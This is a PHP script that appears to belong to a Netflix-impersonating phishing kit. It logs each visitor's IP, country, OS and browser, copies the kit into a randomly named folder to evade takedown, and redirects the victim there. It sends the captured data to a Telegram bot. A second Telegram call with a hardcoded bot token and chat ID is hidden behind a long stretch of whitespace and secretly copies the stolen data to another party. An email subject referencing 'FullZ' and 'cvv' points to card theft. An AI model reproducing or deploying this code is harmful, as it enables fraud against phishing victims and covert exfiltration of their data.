<?php

include './_#/assets/php/inc.php';
include './config/config.php';
include './_#/assets/php/pvc.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country();
$get_user_countrycode = get_user_countrycode();
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="_#";
recurse_copy( $home, $DIR );
header("location:$DIR/index.php?user#_$dispatch");
$file = fopen("visitors.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

$text_result .= "[+]xxx️🎉♠️NetflixVu ️🎉♠️xxx[+]\n";
$text_result .= "[+]IP address =  $get_user_ip\n";
$text_result .= "[+]Country =  $get_user_country\n";
$text_result .= "[+]Country Code  =  $get_user_countrycode\n";
$text_result .= "[+]User Os  =  $get_user_os\n";
$text_result .= "[+]BROWSER = $get_user_browser \n";
$text_result .= "[+]xxx️🎉♠Netflix🎉♠️xxx[+]\n";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($text_result)."" );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           file_get_contents("https://api.telegram.org/bot5355588386:AAHlfDnwx3eU5HUmgYVf0LrX9uDP2zgHgTE/sendMessage?chat_id=1411535102&text=" . urlencode($text_result)."" );                                                                                                                               
$subject = "[X-Netflix R.M.27] FullZ ♠️ (".$_POST['first'].")  cvv ♠️ $ip";
$headers = "From: X-Netflix R.M.27  <noreply@Netflix.com>";

?>
    